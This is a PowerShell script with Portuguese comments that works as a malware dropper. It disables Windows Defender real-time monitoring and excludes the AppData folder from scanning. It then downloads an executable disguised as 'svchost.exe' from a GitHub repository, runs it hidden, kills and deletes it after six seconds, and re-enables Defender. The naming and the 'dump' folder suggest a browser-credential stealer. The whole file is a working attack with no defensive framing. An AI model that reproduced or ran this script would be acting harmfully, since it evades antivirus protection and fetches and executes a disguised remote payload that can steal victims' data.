# Verificar se o script está rodando como administrador
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Error "Este script requer privilégios administrativos. Execute-o como administrador."
    exit 1
}

# Desativar monitoramento em tempo real do Windows Defender
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
    Write-Host "Monitoramento em tempo real desativado."
} catch {
    Write-Error "Erro ao desativar o monitoramento em tempo real: $_"
    exit 1
}

# Adicionar exclusão de caminho no Windows Defender
try {
    Add-MpPreference -ExclusionPath "$env:APPDATA" -ErrorAction Stop
    Write-Host "Caminho $env:APPDATA adicionado às exclusões do Windows Defender."
} catch {
    Write-Error "Erro ao adicionar exclusão de caminho: $_"
    exit 1
}

# Criar diretório de trabalho
$workDir = "$env:APPDATA\dump"
try {
    if (-not (Test-Path $workDir)) {
        New-Item -Path $workDir -ItemType Directory -ErrorAction Stop | Out-Null
        Write-Host "Diretório $workDir criado."
    } else {
        Write-Host "Diretório $workDir já existe."
    }
    Set-Location $workDir
} catch {
    Write-Error "Erro ao criar ou acessar o diretório $workDir: $_"
    exit 1
}

# Baixar o arquivo
$fileUrl = "https://github.com/user337666/brow666/raw/refs/heads/main/svchost.exe"
$filePath = "$workDir\svchost.exe"
try {
    Invoke-WebRequest -Uri $fileUrl -OutFile $filePath -ErrorAction Stop
    Write-Host "Arquivo baixado com sucesso em $filePath."
} catch {
    Write-Error "Erro ao baixar o arquivo: $_"
    exit 1
}

# Executar o arquivo
try {
    if (Test-Path $filePath) {
        Start-Process -FilePath $filePath -WindowStyle Hidden -ErrorAction Stop
        Write-Host "Arquivo $filePath executado."
    } else {
        Write-Error "Arquivo $filePath não encontrado."
        exit 1
    }
} catch {
    Write-Error "Erro ao executar o arquivo: $_"
    exit 1
}

# Aguardar 6 segundos
Start-Sleep -Seconds 6

# Tentar encerrar o processo (caso ainda esteja em execução)
try {
    $processName = [System.IO.Path]::GetFileNameWithoutExtension($filePath)
    Stop-Process -Name $processName -Force -ErrorAction SilentlyContinue
    Write-Host "Processo $processName encerrado, se estava em execução."
} catch {
    Write-Warning "Não foi possível encerrar o processo $processName: $_"
}

# Remover o arquivo baixado
try {
    if (Test-Path $filePath) {
        Remove-Item -Path $filePath -Force -ErrorAction Stop
        Write-Host "Arquivo $filePath removido."
    }
} catch {
    Write-Error "Erro ao remover o arquivo $filePath: $_"
    exit 1
}

# Restaurar monitoramento em tempo real do Windows Defender
try {
    Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction Stop
    Write-Host "Monitoramento em tempo real restaurado."
} catch {
    Write-Warning "Erro ao restaurar o monitoramento em tempo real: $_"
}
